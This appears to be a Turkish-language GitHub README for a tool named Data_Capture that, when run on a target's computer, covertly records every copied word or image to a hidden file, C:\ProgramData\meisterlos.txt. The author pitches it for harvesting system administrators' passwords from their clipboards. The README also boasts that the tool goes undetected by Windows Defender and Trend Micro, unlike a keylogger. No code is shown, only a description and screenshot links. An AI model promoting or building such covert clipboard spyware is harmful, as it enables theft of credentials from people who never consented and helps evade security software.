Merhabalar öncelikle yazmış olduğum aracı sizlere tanıtayım, 
Sistem yöneticileri veya netwokçülerin bakması gereken bir çok sistem vardır ve güvenlik amacı ile hepsinin parolasının hem karmaşık hemde farklı olmasından kaynaklı olarak.
Ezberlemekte zorluk çekerler. Zorluk çekmeleri çok normaldir nereden baksanız 10 veya 20 farklı cihazın parolasını aklınızda tutmak zordur. Bu sebebten kaynaklı olarak keepass gibi
uygulamalara parolalarını kaydederler. Zamanında sistem tarafına baktığımda bu tip uygulamaları bende çok kullandım. Yazmış olduğum araç tam bu arada devreye giriyor. Eğer siz hazırlamış olduğum exe 
dosyasını karşı tarafın cihazında çalıştırabilirseniz "C:\ProgramData" klasör altında "meisterlos.txt" adında bir txt dosyası oluşturur ve hedef kişi bilgisayarında herhangi bir kelimeyi veya resmi kopyaladığı zaman
doğrudan "C:\ProgramData" altında bulunan meisterlos.txt dosyasına kaydeder. Bir sistemcinin gün içerisinde kopyaladığı kelimeler genelde parola'lardır. Bazı kişiler şunu düşünebilir.
Bu programın keyloger'dan ne farkı var gibisinden. Keyloger bir zararlı yazılımdır ve cihazınızda çalıştırmaya kalktığınız anda windows defender bile engelleyecektir :) Benim yazmış olduğum araç
Bir virüs değildir ve kendi şirket bilgisayarımda programımı test ettiğimde cihazımda trendmicro antivirüsü mevcut durumdaydı ve herhangi bir log üretmedi. 

Exe dosyasını indirip kullanabilirsiniz. Eğer yazılım kodunu kendiniz derlemek isterseniz mingw aracı ile derleyebirsiniz.
![1 1](https://github.com/meisterlos/Data_Capture/assets/81145753/c80d6d5a-e879-42db-b74c-5cdf5f4d5bef)
Oluşturmuş olduğu exe dosyasını çalıştırın ve "C:\ProgramData" dizininde meisterlos.txt adında dosya oluşturacaktır. Dosyayı buraya neden oluşturuyoruz dersek ProgramData klasörü gizli moddadır ve kimsenin girip bakmamasından dolayıdır (Tamamen gizlilik).
![2 2](https://github.com/meisterlos/Data_Capture/assets/81145753/4db48982-5ac5-403d-9128-2b05d7e09396)
